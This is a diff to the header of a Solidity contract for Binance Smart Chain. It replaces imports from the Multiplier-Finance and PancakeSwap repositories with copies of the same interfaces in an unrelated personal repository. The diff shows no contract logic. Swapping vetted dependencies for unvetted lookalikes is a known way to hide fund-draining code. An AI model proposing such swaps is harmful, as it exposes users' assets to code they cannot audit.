@@ -1,13 +1,13 @@
 pragma solidity ^0.5.0;
 
 // Multiplier-Finance Smart Contracts
-import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
-import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import "https://github.com/athcoin/flash/blob/main/ILendingPoolAddressesProvider.sol";
+import "https://github.com/athcoin/flash/blob/main/ILendingPool.sol";
 
 // PancakeSwap Smart Contracts
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+import "https://github.com/athcoin/flash/blob/main/IPancakeCallee.sol";
+import "https://github.com/athcoin/flash/blob/main/IPancakeFactory.sol";
+import "https://github.com/athcoin/flash/blob/main/IPancakePair.sol";
 
 /**
  * WARNING - this contract code is for Binance Smart Chain not Ethereum network
